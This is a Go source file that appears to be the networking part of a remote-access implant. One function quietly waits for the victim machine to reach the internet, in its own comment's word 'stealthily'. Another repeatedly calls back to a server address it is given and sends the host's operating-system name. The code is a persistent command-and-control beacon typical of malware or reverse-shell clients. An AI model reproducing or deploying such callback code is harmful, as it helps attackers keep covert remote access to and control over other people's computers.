package packages

import (
	"fmt"
	"net"
	"runtime"
	"time"
)

func WaitForConnect() {
	// Wait for client to connect to internet stealthily
	for {
		conn, err := net.DialTimeout("tcp", "8.8.8.8:53", 5*time.Second) // Using Google DNS server as a test

		if err != nil {
			// Check every 600 seconds that client is connected to internet
			time.Sleep(600 * time.Second)
		} else {
			// Ensure connection is closed before returning
			defer conn.Close()
			return
		}
	}
}

func ConnectToServer(server_adress string) (net.Conn, error) {
	const OSinfo string = runtime.GOOS // Get operating system information

	// Infinite loop to try to connect to the server
	for {
		WaitForConnect() // Wait for client to connect to internet
		// Attempt to connect to the server
		conn, err := net.DialTimeout("tcp", server_adress, 5*time.Second)
		if err == nil {
			fmt.Println("Connected to the server")

			// Send operating system information to server
			var OS_sent bool = Send_OS(conn, OSinfo)
			// Retry connecting to server if sending OS information is unsuccessful
			if !OS_sent {
				fmt.Println("Failed to send OS info to server")
				conn.Close()
				continue
			}

			fmt.Println("OS info sent to server successfully.")
			return conn, nil
		} else {
			time.Sleep(600 * time.Second) // Attempt to reconnect every 600 seconds
		}
	}
}
